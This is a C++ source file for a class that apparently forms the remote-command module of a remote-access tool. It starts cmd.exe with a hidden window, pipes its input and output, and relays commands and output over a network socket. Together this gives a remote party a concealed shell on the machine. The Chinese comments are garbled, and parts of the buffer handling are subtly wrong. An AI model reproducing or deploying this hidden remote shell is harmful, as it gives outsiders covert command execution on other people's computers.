#include "stdafx.h"
#include "CmdShell.h"
#include "Common.h"

CCmdShell::CCmdShell()
{
}


CCmdShell::~CCmdShell()
{
}
void CCmdShell::Cmd_Recv(char recv_buff[1024])
{
	DWORD nByteWritten;
	if (strcmp("exit\r\n", recv_buff) == 0)
	{
		::CloseHandle(hWritePipe);
		::CloseHandle(hReadPipe);
	}
	WriteFile(hWriteFile, recv_buff, strlen(recv_buff), &nByteWritten, NULL);
}

void CCmdShell::Cmd_Send()
{
	//��������
	SECURITY_ATTRIBUTES sa;
	DWORD len;
	char send_buff[1024];
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	CreatePipe(&hReadFile, &hWritePipe, &sa, 0);

	SECURITY_ATTRIBUTES sa_r;
	sa_r.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa_r.lpSecurityDescriptor = NULL;
	sa_r.bInheritHandle = TRUE;
	//�����ܵ�
	CreatePipe(&hReadPipe, &hWriteFile, &sa_r, 0);

	MSGINFO_S msg;
	memset(&msg, 0, sizeof(MSGINFO_S));
	msg.Msg_id = CMDSHELL;

	while (true)
	{
		//��ȡ�ܵ��е�����
		memset(send_buff, 0, sizeof(send_buff));
		if (ReadFile(hReadFile, send_buff, 1023, &len, NULL) == FALSE)
		{
			break;
		}
		//�ѹܵ��е����ݷ��͸�Զ������
		CMD cmd;
		memset(&cmd, 0, sizeof(CMD));
		strcpy_s(cmd.command, sizeof(send_buff), send_buff);
		cmd.flag = 0;
		memcpy(msg.context, &cmd, sizeof(CMD));
		m_sock.MySend(m_sock_cmd, (char*)&msg, sizeof(MSGINFO_S));
	}
	printf("CmdThreadOver\n");
}

void CCmdShell::Cmd_Init()
{
	//��ʼ��
	GetStartupInfoW(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//ʹcmd����������͹ܵ�����
	si.hStdInput = hReadPipe;
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.wShowWindow = SW_HIDE;
	wchar_t cmdline[256] = { 0 };
	//�õ�ϵͳ·��
	GetSystemDirectory(cmdline, sizeof(cmdline));
	wcscat_s(cmdline, _T("\\cmd.exe"));
	//����cmd����
	if (CreateProcess(cmdline, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) == 0)
	{
		printf("CreateProcess Error\n");
	}
	::CloseHandle(pi.hProcess);
}

void CCmdShell::Cmd_GetSock(SOCKET sock)
{
	m_sock_cmd = sock;
}